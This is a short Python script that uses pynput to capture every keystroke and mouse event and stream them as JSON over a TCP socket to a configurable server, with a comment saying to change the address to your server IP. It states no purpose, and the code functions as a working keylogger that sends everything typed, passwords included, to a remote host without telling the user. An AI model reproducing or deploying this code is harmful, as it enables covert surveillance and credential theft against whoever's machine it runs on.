from pynput import keyboard, mouse
import socket
import json

client = None


def connect_to_server():
    global client

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(("localhost", 8000))  # Change to your server IP


def send_event(event_type, data):
    message = {
        "type": event_type,
        "data": data
    }

    client.sendall((json.dumps(message) + "\n").encode())


def on_press(key):
    try:
        send_event("key_press", {"key": key.char})
    except AttributeError:
        send_event("key_press", {"key": str(key)})


def on_release(key):
    send_event("key_release", {"key": str(key)})


def on_move(x, y):
    send_event("mouse_move", {
        "x": x,
        "y": y
    })


def on_click(x, y, button, pressed):
    send_event("mouse_click", {
        "x": x,
        "y": y,
        "button": str(button),
        "pressed": pressed
    })


def on_scroll(x, y, dx, dy):
    send_event("mouse_scroll", {
        "x": x,
        "y": y,
    })


connect_to_server()

with keyboard.Listener(
        on_press=on_press,
        on_release=on_release
) as keyboard_listener, mouse.Listener(
        on_move=on_move,
        on_click=on_click,
        on_scroll=on_scroll
) as mouse_listener:

    keyboard_listener.join()